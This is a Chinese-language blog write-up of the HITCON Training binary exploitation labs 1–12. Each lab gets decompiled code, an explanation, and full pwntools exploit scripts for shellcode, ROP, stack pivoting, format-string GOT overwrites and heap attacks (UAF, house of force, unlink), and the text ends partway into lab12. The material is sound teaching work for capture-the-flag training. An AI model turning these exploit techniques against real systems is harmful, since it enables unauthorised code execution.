---
author: "EP"  
authorLink: "https://linkleyping.top"  
title: "HITCON Training"  
date: 2021-02-19T11:02:48+08:00  
categories : [                                
"writeup",  
]  
draft: false  
---  
## lab1  
略  
## lab2  
反编译  
```c  
unsigned int orw_seccomp()  
{  
  __int16 v1; // [esp+4h] [ebp-84h]  
  char *v2; // [esp+8h] [ebp-80h]  
  char v3; // [esp+Ch] [ebp-7Ch]  
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]  
  
  v4 = __readgsdword(0x14u);  
  qmemcpy(&v3, &unk_8048640, 0x60u);  
  v1 = 12;  
  v2 = &v3;  
  prctl(38, 1, 0, 0, 0);  
  prctl(22, 2, &v1);  
  return __readgsdword(0x14u) ^ v4;  
}  
  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
  orw_seccomp();  
  printf("Give my your shellcode:");  
  read(0, &shellcode, 0xC8u);  
  ((void (*)(void))shellcode)();  
  return 0;  
}  
```  
可以执行shellcode但是存在prctl函数的限制  
### prctl 函数  
这个函数可以对进程就行操作，第一个参数可以指定你想做的事。  
函数原型：  
  
```c  
#include <sys/prctl.h>  
  
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);  
```  
第一个参数是指定相应的操作，这里我们需要重点关注两个：  
```shell  
1. PR_SET_NO_NEW_PRIVS  
2. PR_SET_SECCOMP  
```  
继续看手册上的介绍，对于第一个参数选项，如果 option 设置为 PR_SET_NO_NEW_PRIVS 的话，第二个参数如果设置为 1 的话，不能够进行 execve 的系统调用，同时这个选项还会继承给子进程。  
  
这样的话常规的调用 system 函数、one_gadget 的用不了了，这里的设置点其实和 pwnable.tw 上 orw 那道题一样，只能进行几个系统调用：open、write、read。  
这里也就是调用下面的语句进行设置：  
  
`prctl(PR_SET_NO_NEW_PRIVS, 1LL...);`  
在 `include/linux/prctl.h `中找到` PR_SET_NO_NEW_PRIVS` 常量对应的数值，正好是 38，因此也就对应上了题目中的第一个 prctl 语句。  
  
因此在`orw_seccomp`方法限制之下，不能用system(/bin/sh)或者execve(/bin/sh)了  
想要获取flag只能进行如下操作  
```c  
fd = open("flag")  
read(fd, buf, 0x30)  
write(1, buf, 0x30)  
```  
这段代码对应的汇编是这样的：  
```shell  
> push 1;  
> dec byte ptr [esp];    先将1入栈后在用dec指令减1，得到0作为指针数组的第二个元素  
> push 0x67616c66; 再将“flag”入栈作为指针数组的第一个元素  
> mov ebx,esp;   ebx指向栈顶也就是指向 open函数的第一个参数（指针数组）  
> xor ecx,ecx;     xor清零ecx对应第二个参数  
> xor edx,edx;   xor清零edx对应第三个参数  
> xor eax,eax;   xor清零eax  
> mov al,0x5;   向eax传入系统调用号0x05  
> int 0x80;    调用fp=open("flag",0)  
  
> mov ebx,eax;    ebx被赋值为0x05，read(fp,buf,0x30)  
> xor eax,eax;    xor清空eax  
> mov al,0x3;   传入read函数对应的系统调用号  
> mov ecx,esp;   将栈顶的地址传给ecx作为read的第二个参数，将flag文件中的内容入栈  
> mov dl,0x30;  read的第三个参数，读0x30个字符  
> int 0x80;     调用read(fp,buf,0x30)  
  
> mov al,0x4;   write函数的系统调用号，write(1,buf,0x30)   
> mov bl,1;   ebx对应第一个参数  
> mov dl,0x30;  edx对应第三个参数   
> int 0x80;   调用write(1,buf,0x30)  
```  
实际上`seccomp`(全称：secure computing mode)，将进程可用的系统调用限制为四种：read，write，_exit，sigreturn。最初的这种模式是白名单方式，在这种安全模式下，除了已打开的文件描述符和允许的四种系统调用，如果尝试其他系统调用，内核就会使用SIGKILL或SIGSYS终止该进程。  
  
可以使用`seccomp-tools`来查看可以使用的系统调用。  
  
```shell  
# seccomp-tools dump ./orw.bin  
 line  CODE  JT   JF      K  
=================================  
 0000: 0x20 0x00 0x00 0x00000004  A = arch  
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011  
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number  
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011  
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011  
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011  
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011  
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011  
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011  
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011  
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)  
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW  
```  
  
这里可以看到只有open, read, write这几种。  
  
也可以直接使用`shellcraft`来编写汇编  
  
https://pwntoolsdocinzh-cn.readthedocs.io/en/master/shellcraft.html  
  
```python  
from pwn import *  
context.log_level = "debug"  
p=process('./orw.bin')  
# push  path   
payload=shellcraft.pushstr('./flag.txt')  
# open file  
payload+=shellcraft.open("esp")  
# read file   
payload+=shellcraft.read("eax","esp",0x100)  
# write stdout  
payload+=shellcraft.write(1,"esp",0x100)  
p.recv(1024)  
#gdb.attach(p)  
p.sendline(asm(payload))  
p.recvall()  
p.close()  
```  
  
## lab3  
  
反编译:  
  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
  char s; // [esp+1Ch] [ebp-14h]  
  
  setvbuf(stdout, 0, 2, 0);  
  printf("Name:");  
  read(0, &name, 0x32u);  
  printf("Try your best:");  
  return (int)gets(&s);  
}  
```  
  
简单栈溢出, name(0x0804a060)所在段可执行,可写shellcode，利用gets处的溢出将main的返回地址改成name的地址。  
  
```shell  
pwndbg> vmmap  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
0x8048000 0x8049000 r-xp 1000 0 /home/LAB/lab3/ret2sc  
0x8049000 0x804a000 r-xp 1000 0 /home/LAB/lab3/ret2sc  
0x804a000 0x804b000 rwxp 1000 1000 /home/LAB/lab3/ret2sc  
```  
  
  
  
```python  
#coding=utf-8  
  
from pwn import *  
context.log_level = "debug"  
context.terminal = ["tmux", "split", "-h"]  
  
r = process("./ret2sc")  
r.recvuntil(":")  
shellcode = asm(shellcraft.sh())  
r.sendline(shellcode)  
r.recvuntil(":")  
name_address = 0x0804a060  
payload = "a"*32 + p32(name_address)  
r.sendline(payload)  
r.interactive()  
```  
  
## lab4  
  
反编译:  
  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
  char **v4; // [esp+4h] [ebp-11Ch]  
  int v5; // [esp+8h] [ebp-118h]  
  char src; // [esp+12h] [ebp-10Eh]  
  char buf; // [esp+112h] [ebp-Eh]  
  const void **v8; // [esp+11Ch] [ebp-4h]  
  
  puts("###############################");  
  puts("Do you know return to library ?");  
  puts("###############################");  
  puts("What do you want to see in memory?");  
  printf("Give me an address (in dec) :");  
  fflush(stdout);  
  read(0, &buf, 0xAu);  
  v8 = (const void **)strtol(&buf, v4, v5);  
  See_something(v8);  
  printf("Leave some message for me :");  
  fflush(stdout);  
  read(0, &src, 0x100u);  
  Print_message(&src);  
  puts("Thanks you ~");  
  return 0;  
}  
```  
  
`See_something`函数支持打印出v8地址处的值，可以泄露出libc的地址。然后利用`Print_message`的栈溢出将其返回地址修改成`system`函数的地址。  
  
```python  
#coding=utf-8  
  
from pwn import *  
context.terminal = ["tmux", "split", "-h"]  
context.log_level = "debug"  
DEBUG = 1  
r = process("./ret2lib")  
if DEBUG:  
	gdb.attach(r, """  
		b *0x0804857c  
		c  
	""")  
r.recvuntil(":")  
  
puts_got = 0x0804a01c  
r.sendline(str(puts_got))  
r.recvuntil("The content of the address :")  
puts_str = r.recvuntil('\n')  
success("recv address: " + puts_str)  
puts = int(puts_str, 16)  
success("puts address: " + hex(puts))  
  
system = puts - 0x5fcb0 + 0x3adb0  
sh = 0x804929e  
payload = "a"*0x3c + p32(system) + "aaaa" + p32(sh)  
r.recvuntil(":")  
r.sendline(payload)  
r.interactive()  
```  
  
## lab5  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
  int v4; // [esp+1Ch] [ebp-14h]  
  
  puts("ROP is easy is'nt it ?");  
  printf("Your input :");  
  fflush(stdout);  
  return read(0, &v4, 100);  
}  
```  
  
栈溢出，静态链接，没有`system`函数与`/bin/sh`只能自己构造。  
  
### int 0x80  
通过系统调用实现的hello world代码：  
```shell  
.section .data  
msg:  
        .ascii "Hello world!\n"  
.section .text  
.globl _start  
_start:  
        movl $4, %eax  
        movl $1, %ebx  
        movl $msg, %ecx  
        movl $13, %edx  
        int $0x80  
        movl $1, %eax  
        movl $0, %ebx  
        int $0x80  
```  
系统调用是通过int 0x80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数  
所以需要将`/bin/sh`写入`bss`段，然后利用系统调用执行  
```python  
#coding=utf-8  
from pwn import *  
  
r = process("./simplerop)  
  
gadget = 0x809a15d # mov dword ptr [edx], eax ; ret  
pop_eax_ret = 0x80bae06  
pop_edx_ret = 0x806e82a  
pop_edx_ecx_ebx = 0x0806e850  
pop_eax_ret = 0x080bae06  
buf = 0x80ea060  
int_80 = 0x80493e1  
  
#write to memory  
payload = "a"*32  
payload += p32(pop_edx_ret)  
payload += p32(buf)  
payload += p32(pop_eax_ret)  
payload += "/bin"  
payload += p32(gadget)  
payload += p32(pop_edx_ret)  
payload += p32(buf+4)  
payload += p32(pop_eax_ret)  
payload += "/sh\x00"  
payload += p32(gadget)  
  
#write to register  
payload += p32(pop_edx_ecx_ebx)  
payload += p32(0)  
payload += p32(0)  
payload += p32(buf)  
payload += p32(pop_eax_ret)  
payload += p32(0xb)  
payload += p32(int_80)  
  
print len(payload)  
r.recvuntil(":")  
r.sendline(payload)  
  
r.interactive()  
```  
## lab6  
  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
  char buf; // [esp+0h] [ebp-28h]  
  
  if ( count != 1337 )  
    exit(1);  
  ++count;  
  setvbuf(_bss_start, 0, 2, 0);  
  puts("Try your best :");  
  return read(0, &buf, 0x40u);  
}  
```  
  
栈不可执行。并且可以溢出的大小只有20个字节，而且限制了main函数只能执行一次，所以需要用到**栈迁移**。  
以32位为例，在使用call这个命令，进入一个函数的时候,程序会进行一系列栈操作:  
`push eip+4;push ebp;mov ebp,esp;`来保护现场，避免执行完函数后堆栈不平衡以及找不到之前的入口地址。  
leave ret相当于  
  
```shell  
leave ==> mov esp, ebp;  pop ebp;  
ret   ==> pop eip  
```  
其中`pop eip`相当于将栈顶数据给eip，由于ret返回的是栈顶数据，而栈顶地址是由esp的值决定的，esp的值，从leave可以得出是由ebp决定的。所以我们可以通过覆盖ebp的值来控制ret返回地址。两次`leave ret`即可控制esp为我们想要的地址。由于有`pop ebp`，会使`esp-4`，将ebp 覆盖为想要调整的位置-4即可。  
  
查看程序的空间分布  
  
```shell  
pwndbg> vmmap  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
0x8048000 0x8049000 r-xp 1000 0 /home/LAB/lab6/migration  
0x8049000 0x804a000 r–p 1000 0 /home/LAB/lab6/migration  
0x804a000 0x804b000 rw-p 1000 1000 /home/LAB/lab6/migration  
0xf7d77000 0xf7d78000 rw-p 1000 0  
0xf7d78000 0xf7f28000 r-xp 1b0000 0 /lib/i386-linux-gnu/libc-2.23.so  
```  
  
  
  
可以看到0x804a000后有0x1000的可读写空间，可以将栈迁移到这个地方。  
  
首先第一次需要改变`ebp`的值，然后转到read函数处，读入内容的地址为栈迁移的地址。将read以后的返回地址写成`leave gadget`以此达到栈迁移的目的。  
  
```python  
bss_addr = 0x804a000  
payload = flat(['a'*0x28, bss_addr+0x300, read_addr, leave_gadget, 0, bss_addr+0x300, 0x30])  
```  
  
第二次需要泄露libc的地址，使用puts打印出read/puts函数got表中的地址。  
  
```python  
payload = flat([bss_addr+0x600, puts_addr, pop_ret, puts_got, read_addr, leave_gadget, 0, bss_addr+600, 0x30])  
```  
  
第三次需要返回到system函数处  
  
```python  
payload = flat([bss_addr+0x300, system_addr, pop_ret, bin_addr])  
```  
  
exp:  
  
```python  
from pwn import *  
context.log_level = "debug"  
context.terminal = ['tmux', 'splitw', '-h']  
  
r = process("./migration")  
elf = ELF("./migration")  
libc = ELF("/lib/i386-linux-gnu/libc.so.6")  
  
bss_addr = 0x804a000  
leave_ret = 0x08048418  
pop_ebx_ret = 0x0804836d  
read_plt = elf.plt["read"]  
puts_plt = elf.plt["puts"]  
puts_got = elf.got["puts"]  
  
DEBUG = 1  
if DEBUG:  
        gdb.attach(r, """  
                b *0x08048418  
        """)  
  
payload = "a" * 0x28  
payload += p32(bss_addr + 0x300) # fake ebp  
payload += p32(read_plt) # read(0,buf,0x30)  
payload += p32(leave_ret) # ret to buf  
payload += p32(0) # fd  
payload += p32(bss_addr + 0x300) # buf  
payload += p32(0x30) # bytes  
  
r.recvuntil(":\n")  
r.send(payload)  
sleep(0.2)  
  
payload = p32(bss_addr + 0x600) # fake ebp  
payload += p32(puts_plt) # puts(puts_got)  
payload += p32(pop_ebx_ret)  
payload += p32(puts_got)  
payload += p32(read_plt) # read(0,buf + 0x100,0x30)  
payload += p32(leave_ret) # ret to buf + 0x100  
payload += p32(0) # fd  
payload += p32(bss_addr + 0x600) # buf  
payload += p32(0x30) # bytes  
  
r.sendline(payload)  
sleep(0.2)  
  
libc_base = u32(r.recv(4)) - libc.sym["puts"]  
success("libc_base : " + hex(libc_base))  
system_addr = libc_base + libc.sym["system"]  
bin_sh_addr = libc_base + libc.search("/bin/sh").next()  
  
payload = p32(0)  
payload += p32(system_addr) # system("/bin/sh")  
payload += p32(0)  
payload += p32(bin_sh_addr)  
r.sendline(payload)  
  
r.interactive()  
```  
  
## lab7  
格式化字符串，直接泄露password的值  
  
```python  
#!/usr/bin/env python  
# -*- coding: utf-8 -*-  
from pwn import *  
context.log_level = "debug"  
context.terminal = ["tmux", "split", "-h"]  
r = process("./crack")  
  
#gdb.attach(r, """  
#	b *0x080486E9  
#""")  
  
password_addr = 0x804a048  
r.recvuntil("?")  
  
  
r.sendline(p32(password_addr) + "#" + "%10$s" + "#" )  
r.recvuntil("#")  
p = r.recvuntil("#")  
password = u32(p[:4])  
success("password: " + str(password))  
r.recvuntil(":")  
r.sendline(str(password))  
r.interactive()  
```  
或者直接更改password的值  
```python  
from pwn import *  
context.log_level = 'debug'  
cn = process('./crack')  
p_pwd = 0x0804A048  
fmt_len = 10  
cn.recv()  
pay = fmtstr_payload(fmt_len,{p_pwd:1})  
cn.sendline(pay)  
cn.recv()  
cn.sendline('1')  
cn.recv()  
cn.recv()  
```  
`fmtstr_payload`函数可以直接生成payload。简单使用如下:  
  
```shell  
Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits  
  
The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime.  
  
    Parameters:	  
        offset (int) – the first formatter’s offset you control  
        writes (dict) – dict with addr, value {addr: value, addr2: value2}  
        numbwritten (int) – number of byte already written by the printf function  
        write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)  
        overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string  
        strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)  
        Returns:	  
        The payload in order to do needed writes  
```  
  
  
  
主要用到的就是前2个参数：  
  
- offset：第一个格式化字符存放的位置偏移。  
  - 如何得到这个偏移，其实最简单的就是直接%X打印栈，如下  
  
```shell  
# ./crack  
What your name ? aaaa.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X  
Hello ,aaaa.FFAD7FC8.63.0.F7FA3A9C.3.F7F75410.1.0.1.61616161.2E58252E.252E5825.58252E58.2E58252E  
����H���Your password :11  
Goodbyte  
```  
  
格式化字符串第一个字符aaaa其位置通过不停的打印栈可以得到在偏移10(0xa)位置出现，偏移以0开始，便可以直接得到此参数为10。  
  
- **writes**：一个字典，用来写数据，以 {addr: value, addr2: value2,…}将value写入addr位置。  
- numbwritten：如果printf前面还有打印的字符，就需要设置这个参数  
- write_size：写入的大小，是每次单字节写入，还是一次写入双字节，还是一次写入四个字节。  
  
## lab8  
  
格式化字符串, 目的是写大的数字, 可以直接利用`fmtstr_payload`生成payload  
```python  
#codinf=utf-8  
  
from pwn import *  
  
context.terminal = ["tmux", "split", "-h"]  
context.log_level = "debug"  
  
r = process("./craxme")  
gdb.attach(r, """  
        b *0x80485c6  
        c  
""")  
  
r.recvuntil(":")  
magic = 0x804a038  
payload = fmtstr_payload(7, {magic: 0xFACEB00C})  
r.sendline(payload)  
r.interactive()  
```  
## lab9  
  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
  setvbuf(stdout, 0, 2, 0);  
  return play();  
}  
int play()  
{  
  puts("=====================");  
  puts("  Magic echo Server");  
  puts("=====================");  
  return do_fmt();  
}  
int do_fmt()  
{  
  int result; // eax  
  
  while ( 1 )  
  {  
    read(0, buf, 200u);  
    result = strncmp(buf, "quit", 4u);  
    if ( !result )  
      break;  
    printf(buf);  
  }  
  return result;  
}  
```  
  
这里的格式化字符串存在于bss段并不在栈上，所以不能根据第n个参数来泄露或者更改数据。  
  
>   
> 出题人把格式化串放到堆或是bss段中，不能和原来的一样那样去读取格式化字符串串中的目标地址，不在栈中你是不可能读到的。对于这种题目的做法就是要进行两次漏洞利用，第一次将当前题目变成常规题目样式。第二次就成了常规格式化字符串题目。    
> 具体指的是：    
> 	  第一次：在栈中找一个指向栈里面的指针（这种指针肯定会有，因为堆栈框架就是这样的），往其写入第二次要写入的地址。      
> 	  第二次：常规格式化字符串exp操作    
>   
  
执行到printf函数时的栈如下:  
  
```shell  
00:0000│ esp  0xff8b5fd0 —▸ 0x804a060 (buf) ◂— '%6$p.%15$pstep1'  
01:0004│      0xff8b5fd4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */  
02:0008│      0xff8b5fd8 ◂— 0x4  
03:000c│      0xff8b5fdc —▸ 0x804857c (play+51) ◂— add    esp, 0x10  
04:0010│      0xff8b5fe0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d /* '=====================' */  
05:0014│      0xff8b5fe4 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0  
06:0018│ ebp  0xff8b5fe8 —▸ 0xff8b5ff8 —▸ 0xff8b6008 ◂— 0x0  
07:001c│      0xff8b5fec —▸ 0x8048584 (play+59) ◂— nop  
08:0020│      0xff8b5ff0 —▸ 0xf7f68d60 (_IO_2_1_stdout_) ◂— 0xfbad2887  
09:0024│      0xff8b5ff4 ◂— 0x0  
0a:0028│      0xff8b5ff8 —▸ 0xff8b6008 ◂— 0x0  
0b:002c│      0xff8b5ffc —▸ 0x80485b1 (main+42) ◂— nop  
0c:0030│      0xff8b6000 —▸ 0xf7f683dc (__exit_funcs) —▸ 0xf7f691e0 (initial) ◂— 0x0  
0d:0034│      0xff8b6004 —▸ 0xff8b6020 ◂— 0x1  
0e:0038│      0xff8b6008 ◂— 0x0  
0f:003c│      0xff8b600c —▸ 0xf7dcd647 (__libc_start_main+247) ◂— add    esp, 0x10  
10:0040│      0xff8b6010 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0  
... ↓  
12:0048│      0xff8b6018 ◂— 0x0  
13:004c│      0xff8b601c —▸ 0xf7dcd647 (__libc_start_main+247) ◂— add    esp, 0x10  
14:0050│      0xff8b6020 ◂— 0x1  
15:0054│      0xff8b6024 —▸ 0xff8b60b4 —▸ 0xff8b792a ◂— './playfmt'  
16:0058│      0xff8b6028 —▸ 0xff8b60bc —▸ 0xff8b7934 ◂— 'LANG=C.UTF-8'  
17:005c│      0xff8b602c ◂— 0x0  
... ↓  
1a:0068│      0xff8b6038 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0  
1b:006c│      0xff8b603c —▸ 0xf7f9ec04 ◂— 0x0  
1c:0070│      0xff8b6040 —▸ 0xf7f9e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40  
1d:0074│      0xff8b6044 ◂— 0x0  
1e:0078│      0xff8b6048 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0  
... ↓  
20:0080│      0xff8b6050 ◂— 0x0  
21:0084│      0xff8b6054 ◂— 0x87314245  
22:0088│      0xff8b6058 ◂— 'U\x0c]('  
23:008c│      0xff8b605c ◂— 0x0  
... ↓  
26:0098│      0xff8b6068 ◂— 0x1  
27:009c│      0xff8b606c —▸ 0x8048400 (_start) ◂— xor    ebp, ebp  
28:00a0│      0xff8b6070 ◂— 0x0  
29:00a4│      0xff8b6074 —▸ 0xf7f8f010 (_dl_runtime_resolve+16) ◂— pop    edx  
2a:00a8│      0xff8b6078 —▸ 0xf7f89880 (_dl_fini) ◂— push   ebp  
2b:00ac│      0xff8b607c —▸ 0xf7f9e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40  
2c:00b0│      0xff8b6080 ◂— 0x1  
2d:00b4│      0xff8b6084 —▸ 0x8048400 (_start) ◂— xor    ebp, ebp  
2e:00b8│      0xff8b6088 ◂— 0x0  
2f:00bc│      0xff8b608c —▸ 0x8048421 (_start+33) ◂— hlt  
30:00c0│      0xff8b6090 —▸ 0x8048587 (main) ◂— lea    ecx, [esp + 4]  
31:00c4│      0xff8b6094 ◂— 0x1  
32:00c8│      0xff8b6098 —▸ 0xff8b60b4 —▸ 0xff8b792a ◂— './playfmt'  
33:00cc│      0xff8b609c —▸ 0x80485c0 (__libc_csu_init) ◂— push   ebp  
34:00d0│      0xff8b60a0 —▸ 0x8048620 (__libc_csu_fini) ◂— ret  
35:00d4│      0xff8b60a4 —▸ 0xf7f89880 (_dl_fini) ◂— push   ebp  
36:00d8│      0xff8b60a8 —▸ 0xff8b60ac —▸ 0xf7f9e918 ◂— 0x0  
37:00dc│      0xff8b60ac —▸ 0xf7f9e918 ◂— 0x0  
38:00e0│      0xff8b60b0 ◂— 0x1  
39:00e4│      0xff8b60b4 —▸ 0xff8b792a ◂— './playfmt'  
3a:00e8│      0xff8b60b8 ◂— 0x0  
3b:00ec│      0xff8b60bc —▸ 0xff8b7934 ◂— 'LANG=C.UTF-8  
```  
  
大致需求是：  
  
- 栈上存放了`__libc_start_main`地址，可以用来计算libc地址,同时由于涉及到利用栈上变量当跳板，需要泄露出esp的值。这样就可以得到此时esp值和`lib_start_main`地址，进一步得到libc地址与system地址。  
- 需要存放了栈上地址的栈地址作为跳板，形象地说就是：栈地址->栈地址->栈地址(这个之所以选择栈地址的目的就是为了尽量减少需要修改的字节数量，毕竟数量一多格式化字符串前面的%{n}c就越大，也就越慢了，甚至解不出来)  
  - 可以选择0x15 0x16  
    - 0x15->0x39->栈地址  
    - 0x16->0x3b->栈地址  
- 需要存放0x0804xxxx的栈地址，这样的目的是got表也是0x0804xxxx，这样可以只用修改低2字节。  
  
```python  
"""  
1. 0x15存放的0x39处地址，在此处利用漏洞(%21$hn)将0x39处值修改为0x7地址  
2. 0x16存放的0x3b处地址，在此处利用漏洞(%22$hn)将0x3b处值修改为0xb地址  
3. 此时0x39存放的0x7地址，0x3b存放的0xb地址  
4. 在0x39处利用漏洞(%57$hn)利用漏洞将0x7处存放的值改为printf_got地址  
5. 在0x3b处利用漏洞(%59$hn)利用漏洞将0xb处存放的值改为printf_got+2地址  
6. 至此已经将printf_got以及printf_got+2地址放入了栈上0x7和0xb处。  
7. 利用漏洞将printf_got和printf_got+2两个地址处的双字节修改为system高双字节和低双字节地址  
8. 最后传入”/bin/sh”，在程序调用printf时便实现劫持得到shell  
"""  
from pwn import *  
# context.log_level = "debug"  
  
def hhn(addr,offset):  
    return "%{addr}c%{offset}$hhn".format(addr=addr,offset=offset)  
  
def hn(addr,offset):  
    return "%{addr}c%{offset}$hn".format(addr=addr,offset=offset)  
  
p = process("./playfmt")  
elf = ELF("./playfmt")  
libc = elf.libc  
#step1 leak esp and libc  
payload = "%6$p.%15$pstep1\x00"  
p.sendlineafter("  Magic echo Server\n=====================\n",payload)  
p.recvuntil('0x')  
esp_addr=int(p.recv(8),16)-0x28  
p.recvuntil('0x')  
libc_main_addr=int(p.recv(8),16)-241  
libc_addr = libc_main_addr - libc.symbols["__libc_start_main"] - 6  
system_addr = libc_addr + libc.symbols["system"]  
success("esp addr:{:#x} ".format(esp_addr))  
success("libc addr:{:#x} ".format(libc_addr))  
success("system addr:{:#x} ".format(system_addr))  
  
# step2 change 0x39 and 0x3b with 0x15 0x16  
payload = hn((esp_addr+0x1c)&0xffff,0x15)  
payload += hn(((esp_addr+0x2c)&0xffff-(esp_addr+0x1c)&0xffff)%0xffff,0x16)  
payload += 'step2\x00'  
p.sendlineafter("step1",payload)  
  
#step3 change 0x7 0xb with 0x39 0x3b  
payload = hn((elf.got['printf'])&0xffff,0x39)  
payload += hn(2,0x3b)  
payload += 'step3\x00'  
p.sendlineafter('step2',payload)  
  
#step4 change got with 0x7 0xb  
payload = hhn(system_addr >> 16 & 0xff,0xb)  
payload += hn((system_addr&0xffff) - (system_addr >> 16 & 0xff),0x7)  
payload += 'step4\x00'  
p.sendlineafter('step3',payload)  
  
while True:  
    sleep(0.1)  
    data = p.recv()  
    if data.find("step4") != -1:  
        break  
  
#step5 send /bin/sh  
p.sendline('/bin/sh\x00')  
  
p.interactive()  
```  
  
## lab10  
  
note的数据结构如下:  
  
```c  
struct note {  
	void (*printnote)();  
	char *content ;  
};  
```  
  
在delete功能中存在UAF，可以覆盖printnote函数的指针。  
  
```python  
#coding=utf-8  
  
from pwn import *  
  
context.log_level = "debug"  
context.terminal = ["tmux", "split", "-h"]  
  
r = process("./hacknote")  
  
def addNote(size, content):  
	r.recvuntil(":")  
	r.sendline("1")  
	r.recvuntil(":")  
	r.sendline(str(size))  
	r.recvuntil(":")  
	r.sendline(content)  
  
def deleteNote(idx):  
	r.recvuntil(":")  
	r.sendline("2")  
	r.recvuntil(":")  
	r.sendline(str(idx))  
  
def printNote(idx):  
	r.recvuntil(":")  
	r.sendline("3")  
	r.recvuntil(":")  
	r.sendline(str(idx))  
  
magic = 0x8048986  
addNote(32, "aa")  
addNote(32, "aa")  
  
deleteNote(0)  
deleteNote(1)  
addNote(8, p32(magic) + "aaa")  
  
r.interactive()  
```  
  
## lab11  
  
在change_item方法中存在overflow，有多种利用方式  
  
itemlist的数据结构:  
  
```c  
struct item{  
	int size ;  
	char *name ;  
};  
```  
  
### 1. 修改top chunk大小，再分配chunk，实现地址任意写  
  
第一次malloc会将heap分成两个chunk，第一块是分配出去的chunk，剩下的空间被视为top chunk，之后分配空间不足时会将top chunk切出。  
  
在没有进行add item操作之前就存在一个chunk，用于存储`hello_message`和`goodbye_message`的函数指针。最终执行exit功能的时候会调用`goodbye_message`方法，可以首先修改top chunk的大小，达到任意写，然后修改`goodbye_message`方法的指针。  
  
```python  
#coding=utf-8  
  
from pwn import *  
  
context.log_level = "debug"  
context.terminal = ["tmux", "split", "-h"]  
  
r = process("./bamboobox")  
  
def addItem(size, content):  
	r.recvuntil(":")  
	r.sendline("2")  
	r.recvuntil(":")  
	r.sendline(str(size))  
	r.recvuntil(":")  
	r.sendline(content)  
  
def changeItem(idx, size, content):  
	r.recvuntil(":")  
	r.sendline("3")  
	r.recvuntil(":")  
	r.sendline(str(idx))  
	r.recvuntil(":")  
	r.sendline(str(size))  
	r.recvuntil(":")  
	r.sendline(content)  
  
def deleteItem(idx):  
	r.recvuntil(":")  
	r.sendline("4")  
	r.recvuntil(":")  
	r.sendline(str(idx))  
  
addItem(0x60, "aa")  
changeItem(0, 0x70, "a"*0x60 + p64(0) + p64(0xffffffffffffffff))  
addItem(-160, "aa")  
addItem(16, p64(0x400D49) + p64(0x400D49))  
r.interactive()  
```  
  
### 2. 利用unlink调用magic函数  
  
这里主要是构造能够通过检查的chunk数据  
  
![](/image/HITCON_training/2.png)  
  
```python  
addItem(0x80,"a"*8) #chunk0  
addItem(0x80,"b"*8) #chunk1  
addItem(0x80,"c"*8) #chunk2  
#需要注意，这三个chunk的大小都要保证不在fastbin的范围内  
#因为fastbin的size的p位默认为1，就无法进行unlink操作  
  
FD = 0x6020c8 - 3*8 #在bss段，0x6020c8恰好存储了chunk0的指针  
BK = FD +8  
payload1 = p64(0)+p64(0x81)+p64(FD)+p64(BK)+"a"*0x60  
payload1 += p64(0x80)+p64(0x90)  
changeItem(0,0x90,payload1)  
deleteItem(1)  
#构造一个假的大小为0x80的fake_chunk，同时通过堆溢出  
#将chunk1的pre_size和size进行修改，使得size的p位为0  
#在free掉chunk1的时候，fake_chunk和chunk1就会进行合并  
#这时就会对fake_chunk进行unlink操作  
#这时就要对FD和BK进行精心构造，使得能够绕过unlink的检查  
#也就是使得：FD->bk = p  &&  BK->fd = p  
#在通过检查后，unlink会导致：*p=p-3*8=0x6020c8 - 3*8  
  
  
payload2 = p64(0)+p64(0)+p64(0x80)+p64(FD)+p64(0x80)+p64(atoi_got)  
changeItem(0,len(payload2),payload2)  
changeItem(1,0x10,p64(magic))  
#这时向chunk0中输入内容，实际上也就是向0x6020c8 - 3*8中输入内容  
#可以修改chunk_list，从而构造 UAF   
r.recvuntil("Your choice:")  
r.sendline("5")  
r.interactive()  
```  
  
## lab12  
  
fastbin double free漏洞，利用double free修改fd使得下下次malloc该chunk的时候可以取得自己想要的位置。  
  
在下一次malloc(bytes)的时候，根据bytes的大小取得index后，到对应的fastbin找，取出后检查该chunk的(unsigned long)size是否属于该fastbin。  
  
